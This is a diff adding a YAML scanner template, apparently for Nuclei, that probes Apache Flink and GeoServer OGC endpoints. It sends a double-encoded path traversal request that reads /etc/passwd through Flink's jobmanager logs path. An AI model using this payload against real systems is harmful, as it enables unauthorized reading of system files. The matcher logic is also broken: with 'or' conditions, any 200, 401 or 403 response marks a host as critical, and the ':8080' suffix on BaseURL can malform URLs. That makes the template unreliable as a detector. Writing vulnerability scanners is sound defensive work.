@@ -1,0 +1,47 @@
+id: flink-geoserver-misconfig
+info:
+  name: Apache Flink and GeoServer OGC Misconfiguration Detection
+  author: pwn
+  severity: critical
+  description: Detects exposed Apache Flink or GeoServer OGC instances with accessible sensitive endpoints or vulnerable to path traversal, potentially leading to unauthorized access or system file exposure.
+  tags: flink, geoserver, misconfiguration, path-traversal
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/geoserver/ows?service"
+      - "{{BaseURL}}/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
+      - "{{BaseURL}}:8080/geoserver/ows?service"
+      - "{{BaseURL}}:8080/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "GeoServer"
+          - "Flink"
+          - "Apache Flink"
+          - "passwd"
+        part: body
+        condition: or
+        case-insensitive: true
+      - type: word
+        words:
+          - "GeoServer"
+          - "Flink"
+        part: body
+        condition: or
+        case-insensitive: true
+      - type: status
+        status:
+          - 403
+          - 401
+    extractors:
+      - type: regex
+        name: matched_path
+        part: request
+        regex:
+          - "https?://[^/]+(/.*)"
+        group: 1
